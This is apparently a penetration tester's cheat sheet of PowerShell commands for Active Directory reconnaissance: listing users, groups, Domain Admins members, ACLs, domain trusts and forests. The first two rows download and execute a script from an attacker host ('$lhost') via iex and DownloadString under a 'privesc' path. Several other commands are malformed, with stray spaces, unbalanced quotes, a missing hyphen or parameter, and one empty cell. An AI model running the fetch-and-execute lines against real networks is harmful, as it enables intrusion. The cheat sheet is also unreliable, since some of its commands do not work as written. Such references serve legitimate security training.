# ActiveDirectory PowerShell Module

| Info                                                              | Command                                                                                                                                                                       |
| ----------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Download & Import Microsoft Active Directory Module               | `iex (new-Object Net.WebClient).DownloadString('http://$lhost/windows/privesc/Import-ActiveDirectory.ps1');Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose` |
| Download & Import Microsoft Active Directory Module               | `iex (new-Object Net.WebClient).DownloadString('http://$lhost/windows/privesc/ActiveDirectory.psd1');Import-Module .\ActiveDirectory.psd1`                                    |
| Get Domain (ActiveDirectory Module)                               | `Get-ADDomain`                                                                                                                                                                |
| Get object of another domain (ActiveDirectory Module)             | `Get-ADDomain -Identity domain.local`                                                                                                                                         |
| Get domain SID for the current domain (ActiveDirectory Module)    | `(Get-ADDomain).DomainSID`                                                                                                                                                    |
| Get domain policy for the current domain (ActiveDirectory Module) | \`\`                                                                                                                                                                          |
| Get domain controllers for the current domain                     | `Get-ADDomainController`                                                                                                                                                      |
| Get domain controllers for another domain                         | `Get-ADDomainController - DomainName domain.local -Discover`                                                                                                                  |
| Get a list of users in the current domain                         | `Get-ADUser -Filter * -Properties *`                                                                                                                                          |
| Get list of properties for all users in the current domain        | `Get-ADUser -Filter * - Properties *`                                                                                                                                         |
| Get User description                                              | \`Get-ADUser - Filter 'Description -like "_built_" -Properties Description                                                                                                    |
| Get a list of computers in the current domain                     | `Get-ADComputer -Filter * \| Select Name`                                                                                                                                     |
| Get a list of computers in the current domain                     | `Get-ADComputer 'OperatingSystem -like "*Server 2016*" -Properties OperatingSystem \| Select Name,OperatingSystem`                                                            |
| Get a list of computers in the current domain                     | `Get-ADComputer -Filter * -Properties DNSHostName \| % {Test-Connection -Count 1 -ComputerName $_.DNSHostName}`                                                               |
| Get a list of computers in the current domain                     | `Get-ADComputer -Filter * -Properties *`                                                                                                                                      |
| Get all groups in the current domain                              | `Get-ADGroup -Filter * \| Select Name`                                                                                                                                        |
| Get all groups in the current domain                              | `Get-ADGroup -Filter * -Properties *`                                                                                                                                         |
| Get all groups in the current domain with admin in the name       | `Get-ADGroup -Filter 'Name -like "*admin*"' \| select Name`                                                                                                                   |
| Get all the members of the Domain Admins group                    | `Get-ADGroupMember -Identity "Domain Admins" -Recursive`                                                                                                                      |
| Get the group memberships for a user                              | `Get-ADPrincipalGroupMembership -Identity user1`                                                                                                                              |
| Get resultant set of group policies                               | `GetGPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html`                                                                                         |
| Get OUs in a domain                                               | `Get-ADOrganizationalUnit -Filter * -Properties *`                                                                                                                            |
| Enumerate ACLs                                                    | `(Get-Acl 'AD:\CN=Administrators,CN=Users,DC=domain,DC=local).Access`                                                                                                         |
| Get a list of all domain trusts for the current domain            | `Get-ADTrust`                                                                                                                                                                 |
| Get a list of all domain trusts for the current domain            | `Get-ADTrust -Identity domain.local`                                                                                                                                          |
| Get details about the curren forest                               | `Get-ADForest`                                                                                                                                                                |
| Get details about the curren forest                               | `Get-ADForest -Identity domain.local`                                                                                                                                         |
| Get all domains in the current forest                             | `(Get-ADForest).Domains`                                                                                                                                                      |
| Get all global catalogs for the current forest                    | `Get-ADForest \| select -ExpandProperty GlobalCatalogs`                                                                                                                       |
| Map trusts of a forest                                            | `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"`                                                                                                                  |
